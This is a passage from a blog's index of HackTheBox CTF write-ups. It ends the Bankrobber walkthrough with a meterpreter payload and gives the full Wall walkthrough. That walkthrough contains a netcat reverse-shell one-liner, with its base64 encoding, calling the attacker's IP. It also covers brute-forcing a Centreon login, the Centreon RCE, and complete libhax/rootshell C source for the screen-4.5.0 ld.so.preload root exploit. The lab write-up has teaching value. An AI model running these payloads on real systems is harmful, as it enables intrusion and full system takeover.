E-coin transfer by running my payload inside the Bankrobber machine’ and create <code>meterpreter</code> sessions.<br>Instead of putting amount of E-Coins in e-coin transfer. I executed my payload with this line.</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line">&amp; ..\\..\\..\\..\\..\\..\Users\\C:\Users\Cortin\payload.exe</span><br></pre></td></tr></table></figure><p><img src="/img/bank/bank-RCE.png" alt="HackTheBox-Bankrobber/bank-RCE.png" title="Bank RCE"></p><p>After executed it i got a response from my <code>meterpreter</code> sessions.</p><p><img src="/img/bank/bank-metasploit-root.png" alt="HackTheBox-Bankrobber/bank-metasploit-root.png" title="Bank root"></p><h3 id="Administrator-Shell"><a href="#Administrator-Shell" class="headerlink" title="Administrator Shell"></a>Administrator Shell</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Bankrobber</span><br><span class="line">meterpreter &gt; shell</span><br><span class="line">Process 584 created.</span><br><span class="line">Channel 1 created.</span><br><span class="line">Microsoft Windows [Version 10.0.14393]</span><br><span class="line">(c) 2016 Microsoft Corporation. Alle rechten voorbehouden.</span><br></pre></td></tr></table></figure><p>and Finally rooted !<br>   ⇒ nt authority\system<br><img src="/img/bank/bank-rooted!.png" alt="HackTheBox-Bankrobber/bank-rooted!.png" title="Bank rooted"></p><p>Get <code>root.txt</code><br><img src="/img/bank/bank-root.png" alt="HackTheBox-Bankrobber/bank-root.png" title="Bank rooted"></p><hr><p>Referrences:<br><a href="https://www.speedguide.net/port.php?port=910" target="_blank" rel="noopener">https://www.speedguide.net/port.php?port=910</a><br><a href="https://www.adminsub.net/tcp-udp-port-finder/910" target="_blank" rel="noopener">https://www.adminsub.net/tcp-udp-port-finder/910</a><br><a href="https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/" target="_blank" rel="noopener">https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/</a><br><a href="https://buer.haus/2017/06/29/escalating-xss-in-phantomjs-image-rendering-to-ssrflocal-file-read/" target="_blank" rel="noopener">https://buer.haus/2017/06/29/escalating-xss-in-phantomjs-image-rendering-to-ssrflocal-file-read/</a></p>]]></content>
      
      
      <categories>
          
          <category> HackTheBox </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> pentest </tag>
            
            <tag> xss </tag>
            
            <tag> sql-injection </tag>
            
            <tag> rce </tag>
            
            <tag> windows </tag>
            
            <tag> retired </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HackTheBox - Wall</title>
      <link href="/2019-07-12/HackTheBox-Wall/"/>
      <url>/2019-07-12/HackTheBox-Wall/</url>
      
        <content type="html"><![CDATA[<p><img src="/img/wall/wall-detail.png" alt="HackTheBox-Wall/Nmap.png" title="Wall machine details"></p><h2 id="Quick-Summary"><a href="#Quick-Summary" class="headerlink" title="Quick Summary"></a>Quick Summary</h2><p>   → Wall is my very first machine on HackTheBox that I hacked. It is running in Web Application that vulnerable to <code>RCE</code>(Remote Code Execution), a classification of security vulnerabilities. <code>RCE</code> enables a remote attacker to execute arbitrary code, bypassing security authorization, and by abusing this vulnerabilities I manage to get in into the machine. First I fall on to the rabbit hole which is the <code>aa.php</code>, and <code>server-status</code> page. The tricky part of this machine was finding the hidden page of the web application because it’s not something normally shows up in the wordlists. I use the Burp Suite and edit the Request fo find some interesting stuffs and then i found the right page of the webapps. The vulnerability inside is a <code>SUID</code> binary which users can get a full privileges.</p><h2 id="Penetration-Testing-Methodologies"><a href="#Penetration-Testing-Methodologies" class="headerlink" title="Penetration Testing Methodologies"></a>Penetration Testing Methodologies</h2><ol><li><p><strong>Network Scanning</strong></p><p>→ Nmap scan</p><p>→ discover open ports and what services are running</p></li><li><p><strong>Enumeration</strong></p><p>→ Browsing the HTTP Service</p><p>→ Bruteforce the Web page directories</p><p>→ Finding the hidden page</p></li><li><p><strong>Post - Exploitation</strong></p><p>→ Exploring the web page</p><p>→ Bruteforce the credentials using the token</p><p>→ Logging in as admin</p></li><li><p><strong>Exploitation</strong></p><p>→ Getting the Reverse shell using <a href="https://shells.systems/centreon-v19-04-remote-code-execution-cve-2019-13024/" target="_blank" rel="noopener">CVE-2019-13024</a>.</p><p>→ Find some interesting things</p><p>→ Check Linux Binaries</p></li><li><p><strong>Privilege Escalation</strong></p><p>→ Exploit the unusual Linux binaries</p><p>→ Execute the exploit</p><p>→ Get the root shell and read the root and user file</p></li></ol><h2 id="Network-Scanning"><a href="#Network-Scanning" class="headerlink" title="Network Scanning"></a>Network Scanning</h2><h3 id="Walkthrough"><a href="#Walkthrough" class="headerlink" title="Walkthrough"></a>Walkthrough</h3><p>→ First, is to scan the target IP using <strong>Nmap</strong> to get information about the various services that are running on the target machine. We use</p><hr><ul><li>-sV ⇒ Probe open ports to determine service/version info</li><li>-sC ⇒ equivalent to —script=default</li><li>-A  ⇒ Enable OS detection, version detection, script scanning, and traceroute</li><li>-oN ⇒ to save our scan results to a text file</li></ul><hr><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"><span class="string">nmap</span> <span class="string">-sV</span> <span class="string">-sC</span> <span class="string">-A</span> <span class="number">10.10</span><span class="number">.10</span><span class="number">.157</span> <span class="string">-oN</span> <span class="string">nmap-Wall</span></span><br></pre></td></tr></table></figure><h3 id="Nmap-results"><a href="#Nmap-results" class="headerlink" title="Nmap results"></a>Nmap results</h3><p><img src="/img/wall/Nmap.png" alt="HackTheBox-Wall/Nmap.png" title="Nmap Results"></p><h2 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h2><p>By visiting the http page we got the default page of Apache Web Server<br><img src="/img/wall/default_page.png" alt="HackTheBox-Wall/default_page.png" title="Apache Defaul page"></p><p>We try to explore the default page by inspecting the source code but I can’t find any interesting things there so I’ll try to bruteforce the directories to look for hidden page. I use <strong><a href="https://github.com/OJ/gobuster" target="_blank" rel="noopener">gobuster</a></strong> with medium.txt file. To save the outfile we use <code>-o</code> <code>name of a file</code></p><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line">gobuster dir -u http:<span class="regexp">//</span><span class="number">10.10</span>.<span class="number">10.157</span> -w <span class="regexp">/usr/</span>share<span class="regexp">/dirbuster/</span>wordlists<span class="regexp">/directory-list-lowercase-2.3-medium.txt -o wall-dir</span></span><br></pre></td></tr></table></figure><p><img src="/img/wall/gobuster.png" alt="HackTheBox-Wall/gobuster.png" title="Gobuster"></p><p>After a minutes of bruteforcing I got the following directories.</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># gobuster results</span></span><br><span class="line"></span><br><span class="line">→ /aa.php  (Status: 200)</span><br><span class="line"></span><br><span class="line">→ /server-status  (Status: 401)</span><br><span class="line"></span><br><span class="line">→ /monitoring  (Status: 403)</span><br></pre></td></tr></table></figure><p>Now let’s take a look with the following page I got. First the “aa.php”<br><code>http://10.10.10.157/aa.php</code></p><p><img src="/img/wall/aa_page.png" alt="HackTheBox-Wall/aa_page.png" title="aa.php page"><br>No interesting things here.</p><p>So next the <code>server-status</code> page<br><code>http://10.10.10.157/server-status</code></p><p><img src="/img/wall/forbidden.png" alt="HackTheBox-Wall/forbidden.png" title="forbidden page"><br>And I got the Forbidden page.</p><p>Next the is the <code>monitoring</code> page<br><code>http://10.10.10.157/monitoring</code></p><p><img src="/img/wall/monitoring.png" alt="HackTheBox-Wall/monitoring.png" title="monitoring page"></p><p>And I got a pop-up login. This page is very interesting but I don’t have any credentials so i will leave this for a while and try to enumerate again the machine using <a href="https://github.com/sullo/nikto" target="_blank" rel="noopener">Nikto</a> - Web Server scanner.</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line">nikto -h http://10.10.10.157/</span><br></pre></td></tr></table></figure><h3 id="Nikto-results"><a href="#Nikto-results" class="headerlink" title="Nikto results"></a>Nikto results</h3><p><img src="/img/wall/nikto.png" alt="HackTheBox-Wall/nikto.png" title="nikto results"></p><p>Next is I will intercept this request with <a href="https://portswigger.net/burp" target="_blank" rel="noopener">BurpSuite</a> (A Web Penetration Testing tool) and send this to Repeater.</p><p><img src="/img/wall/burp.png" alt="HackTheBox-Wall/burp.png" title="Burp Suite"></p><p>Repeater<br><img src="/img/wall/burp_repeater.png" alt="HackTheBox-Wall/burp_repeater.png" title="Burp Suite Repeater"></p><p>Now we will change the request body method into “POST” and let’s see what response we can get.<br><img src="/img/wall/burp_centreon.png" alt="HackTheBox-Wall/burp_centreon.png" title="The centreon page"></p><p>As you can see there’s a redirected page in URL=<code>&#39;/centreon&#39;</code> so I try this on browser to find out what is this.</p><p><img src="/img/wall/centreon_login.png" alt="HackTheBox-Wall/centreon_login.png"></p><h3 id="Centreon-Login-Page-v-19-04"><a href="#Centreon-Login-Page-v-19-04" class="headerlink" title="Centreon Login Page v. 19.04"></a>Centreon Login Page v. 19.04</h3><p>Then a Centreon Login page with version 19.04. Centreon is an open source infrastructure monitoring software.<br>Based on some googling for default creds also in the documentation of the software, I tried all combinations of “centreon”, “admin”, and “root”, but didn’t get logged in.</p><hr><h2 id="Post-Exploitation"><a href="#Post-Exploitation" class="headerlink" title="Post - Exploitation"></a>Post - Exploitation</h2><h3 id="Finding-Exploit"><a href="#Finding-Exploit" class="headerlink" title="Finding Exploit"></a>Finding Exploit</h3><p>I try to explore the login page by viewing the page source code and try to look if there’s any interesting things.<br>I also google the version of the <code>Centreon v19.04</code> and I found out that the version of this software is vulnerable to RCE(<a href="https://www.sciencedirect.com/topics/computer-science/remote-code-execution" target="_blank" rel="noopener">Remote Code Execution</a>) attack.</p><h3 id="Login-page-view-page-source"><a href="#Login-page-view-page-source" class="headerlink" title="Login page view page source"></a>Login page view page source</h3><p><img src="/img/wall/view_source.png" alt="HackTheBox-Wall/view_source.png" title="Page source"></p><h3 id="Brute-Force-the-Credentials"><a href="#Brute-Force-the-Credentials" class="headerlink" title="Brute Force the Credentials"></a>Brute Force the Credentials</h3><p>By viewing the page source code, there’s a hidden value of Centreon <code>CSRF</code> token. After some research luckily I found this <a href="https://github.com/J3wker/anti-CSRF_Token-Bruteforce" target="_blank" rel="noopener">script</a> on Github that can use to bruteforce the logins which are using <code>anti-CSRF</code> tokens to stop you from brute forcing them. I try to use this by the following commands based on the instructions of the script.</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash shell</span></span><br><span class="line">python3 brutecsrf.py --url http://test.com/index.php --csrf name_csrf_token_in_HTML_form --u admin --fuser user_name_in_HTML_form --passwd password_name_in_HTML_form</span><br></pre></td></tr></table></figure><p><img src="/img/wall/password1.png" alt="HackTheBox-Wall/password1.png" title="Login page password"></p><p>After a minute I get the “password1” now try to use this password for login with default username “admin” ;) then I can now logged in !</p><p><img src="/img/wall/centreon.png" alt="HackTheBox-Wall/centreon.png"><br><strong>Centreon Main Page</strong></p><hr><h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h2><p>We know that the Centreon version on this machine was vulnerable to RCE(<a href="https://www.sciencedirect.com/topics/computer-science/remote-code-execution" target="_blank" rel="noopener">Remote Code Execution</a>) attack. So I did search on Google to find an article about it and what I saw was article from creator (Askar) of this box.</p><p><img src="/img/wall/google1.png" alt="HackTheBox-Wall/google1.png"></p><h2 id="Exploit-Blog-for-Centreon"><a href="#Exploit-Blog-for-Centreon" class="headerlink" title="Exploit Blog for Centreon"></a>Exploit Blog for Centreon</h2><p>Centreon v19.04 Remote Code Execution. (CVE-2019-13024)</p><a href="https://shells.systems/centreon-v19-04-remote-code-execution-cve-2019-13024/" class="link-preview" target="rel"><div class="link-area"><div class="og-image"><img src="https://shells.systems/wp-content/uploads/2019/06/post-exploit.png"></img></div><div class="descriptions"><div class="og-title">Centreon v19.04 Remote Code Execution (CVE-2019-13024) - Shells.Systems</div><div class="og-description">Estimated Reading Time:  6 minutes Summary about Centreon Ce…</div></div></div></a><hr><p>The exploitation triggers by adding an arbitrary command in the <code>nagios_bin</code> parameter when setup a new configuration or update configuration for a poller.</p><p><img src="/img/wall/payload_line.png" alt="HackTheBox-Wall/payload_line.png"></p><p>Based on the blog we can set a payload in <code>Monitoring Engine Binary</code>.</p><p>I tried to use the exploit script but it’s not working, I didn’t get a reverse shell, my Ncat listener can’t get any response whenever I run the exploit even I modified it.<br>So i tried to encode my payload into base64 hoping that this one will work.</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># My payload</span></span><br><span class="line">rm /tmp/x22;mkfifo /tmp/xx2;cat /tmp/xx2|/bin/sh -i 2&gt;&amp;1|/bin/nc 10.10.15.44 666 &gt;/tmp/xx2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># convert to base64</span></span><br><span class="line">cm0gL3RtcC94MjI7bWtmaWZvIC90bXAveHgyO2NhdCAvdG1wL3h4MnwvYmluL3NoIC1pIDI+JjF8L2Jpbi9uYyAxMC4xMC4xNS40NCA2NjYgPi90bXAveHgy</span><br></pre></td></tr></table></figure><p>Now I will paste our base64 code payload into <code>Monitoring Engine Binary</code>.</p><p>In the exploit script i will paste my payload too in <code>nagios_bin</code> line. with echo${IFS}</p><p>After running the exploit with my Ncat listener, still didn’t work. So I tried to search again on Google to look for other exploit of Centreon RCE and i found <a href="https://github.com/get-get-get-get/Centreon-RCE" target="_blank" rel="noopener">this.</a> Same procedure I will paste again my payload to <code>nagios_bin</code> line and next is run the exploit with my Ncat listener.</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./centreon_rce.py -t http://10.10.10.157/centreon -u admin -p password1</span><br></pre></td></tr></table></figure><h3 id="WWW-DATA-SHELL-gt-shelby"><a href="#WWW-DATA-SHELL-gt-shelby" class="headerlink" title="WWW-DATA SHELL -&gt; shelby"></a>WWW-DATA SHELL -&gt; shelby</h3><p>Running this and we now get the www-data shell.<br><img src="/img/wall/www_data_shell.png" alt="HackTheBox-Wall/www_data_shell.png" title="WWW-DATA SHELL"></p><p>As you can see Bash’s job control is turned off. using this line we can enable bash command in the shell.</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> TERM=xterm</span><br></pre></td></tr></table></figure><p>Now I can use commands like “id”.</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ id</span><br><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data),6000(centreon)</span><br></pre></td></tr></table></figure><p>upgrade the shell with python</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">'import pty; pty.spawn("/bin/bash");'</span></span><br></pre></td></tr></table></figure><p><img src="/img/wall/right_shell.png" alt="HackTheBox-Wall/right_shell.png" title="www-data@Wall shell"></p><hr><h2 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h2><h3 id="Linux-SUID-Binaries"><a href="#Linux-SUID-Binaries" class="headerlink" title="Linux SUID Binaries"></a>Linux SUID Binaries</h3><p>Now it’s time to find some interesting things in this machine that I can use for Privilege Escalation. First I look into Linux SUID binaries. and I spotted something odd, the <code>screen</code> with version 4-5.0 was the biggest hint for me.</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find / -perm -4000 2&gt;/dev/null | xargs ls -la</span><br></pre></td></tr></table></figure><p><img src="/img/wall/screen.png" alt="HackTheBox-Wall/screen.png" title="screen-4-5.0"></p><h3 id="Screen-4-5-0"><a href="#Screen-4-5-0" class="headerlink" title="Screen 4-5.0"></a>Screen 4-5.0</h3><p>If you are familiar with Linux SUID’ you will notice that the “/bin/screen-4.5.0” is not a normally or default Linux suid so this one is very interesting so trying to use <a href="https://github.com/offensive-security/exploitdb/blob/master/searchsploit" target="_blank" rel="noopener">Searchsploit</a> if there’s an existing exploit in “screen-4.5.0”. And there is.</p><p><img src="/img/wall/searchsploit.png" alt="HackTheBox-Wall/searchsploit.png" title="searchsploit results"></p><p>I read first the .txt file of the exploit to know on how can I use this for exploitation.</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">searchsploit -x exploits/linux/<span class="built_in">local</span>/41152.txt</span><br></pre></td></tr></table></figure><p><img src="/img/wall/screen_readme.png" alt="HackTheBox-Wall/screen_readme.png" title="screen readme"></p><p>It check opens the logfile with full root privileges. This allows us to truncate any file or create a root-owned file with any contents in any directory and can be easily exploited to full root acces in several ways.</p><p>Base on the instructions of the exploit, I will try to create a file “bla-bla” then use this commands “ls -la”</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">screen -D -m -L bla.bla <span class="built_in">echo</span> fail</span><br><span class="line"></span><br><span class="line">ls -la</span><br></pre></td></tr></table></figure><p><img src="/img/wall/blabla.png" alt="HackTheBox-Wall/blabla.png" title="blabla"></p><p>As you can see, the “bla.bla” file is owned by root.</p><p>I will now use the exploit script we get on the searchsploit, but it didn’t work properly so I did it manually, first I compiled the binaries on my Kali machine:</p><h3 id="libhax-c-code"><a href="#libhax-c-code" class="headerlink" title="libhax.c - code"></a>libhax.c - code</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// libhax</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line">__attribute__ ((__constructor__))</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dropshell</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    chown(<span class="string">"/tmp/rootshell"</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    chmod(<span class="string">"/tmp/rootshell"</span>, <span class="number">04755</span>);</span><br><span class="line">    unlink(<span class="string">"/etc/ld.so.preload"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[+] done!\n"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="rootshell-c-code"><a href="#rootshell-c-code" class="headerlink" title="rootshell.c - code"></a>rootshell.c - code</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// rootshell</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    setuid(<span class="number">0</span>);</span><br><span class="line">    setgid(<span class="number">0</span>);</span><br><span class="line">    seteuid(<span class="number">0</span>);</span><br><span class="line">    setegid(<span class="number">0</span>);</span><br><span class="line">    execvp(<span class="string">"/bin/sh"</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Now is to compile this two exploit.</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// libhax</span></span><br><span class="line">gcc -fPIC -shared -ldl -o libhax.so libhax.c</span><br><span class="line"></span><br><span class="line"><span class="comment">// and then the rootshell</span></span><br><span class="line">gcc -o rootshell rootshell.c</span><br></pre></td></tr></table></figure><p>After I compile the exploit i’ll transfer it to the target. To transfer the file I set a local HTTP Server in my Kali machine.</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python -m SimpleHTTPServer <span class="number">80</span></span><br></pre></td></tr></table></figure><p>to download it into Wall machine, we can use <code>wget</code> commands in the <code>tmp</code> directory.</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># download the libhax</span></span><br><span class="line">wget http://10.10.15.44/libhax.so</span><br><span class="line"></span><br><span class="line"><span class="comment"># next is the rootshell</span></span><br><span class="line">wget http://10.10.15.44/libhax.c</span><br></pre></td></tr></table></figure><h3 id="Going-to-Root"><a href="#Going-to-Root" class="headerlink" title="Going to Root"></a>Going to Root</h3><p>Now i will go to the “/etc/“ directories in the target and do the exploit</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">www-data@Wall:&#x2F;tmp$ cd &#x2F;etc</span><br><span class="line">cd &#x2F;etc</span><br><span class="line">www-data@Wall:&#x2F;etc$ umask 000</span><br><span class="line">umask 000</span><br><span class="line">www-data@Wall:&#x2F;etc$ &#x2F;bin&#x2F;screen-4.5.0 -D -m -L ld.so.preload echo -ne  &quot;\x0a&#x2F;tmp&#x2F;libhax.so&quot;</span><br><span class="line">&#x2F;libhax.so&quot;-4.5.0 -D -m -L ld.so.preload echo -ne  &quot;\x0a&#x2F;tmp&#x2F;</span><br><span class="line">www-data@Wall:&#x2F;etc$ &#x2F;bin&#x2F;screen-4.5.0 -ls</span><br><span class="line">&#x2F;bin&#x2F;screen-4.5.0 -ls</span><br><span class="line">&#39; from &#x2F;etc&#x2F;ld.so.preload cannot be preloaded (cannot open shared object file): ignored.</span><br><span class="line">[+] done!</span><br><span class="line">No Sockets found in &#x2F;tmp&#x2F;screens&#x2F;S-www-data.</span><br></pre></td></tr></table></figure><p>Now going to “/tmp/rootshell”</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">www-data@Wall:&#x2F;etc$ &#x2F;tmp&#x2F;rootshell</span><br><span class="line">&#x2F;tmp&#x2F;rootshell</span><br><span class="line"># id</span><br><span class="line">id</span><br><span class="line">uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root),33(www-data),6000(centreon)</span><br><span class="line"># cat &#x2F;home&#x2F;shelby&#x2F;user.txt | wc -c</span><br><span class="line">cat &#x2F;home&#x2F;shelby&#x2F;user.txt | wc -c</span><br><span class="line">33</span><br><span class="line"># cat &#x2F;root&#x2F;root.txt | wc -c</span><br><span class="line">cat &#x2F;root&#x2F;root.txt | wc -c</span><br><span class="line">33</span><br><span class="line">#</span><br></pre></td></tr></table></figure><p><img src="/img/wall/rooted!!.png" alt="HackTheBox-Wall/rooted!!.png" title="Machine Pawned!!"></p><p>Now that I’m root, I can now grab both flags – <code>user.txt</code> &amp; <code>root.txt</code> :)</p>]]></content>
      
      
      <categories>
          
          <category> HackTheBox </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> htb </tag>
            
            <tag> pentest </tag>
            
            <tag> cve </tag>
            
            <tag> python </tag>
            
            <tag> rce </tag>
            
            <tag> linux </tag>
            
            <tag> retired </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
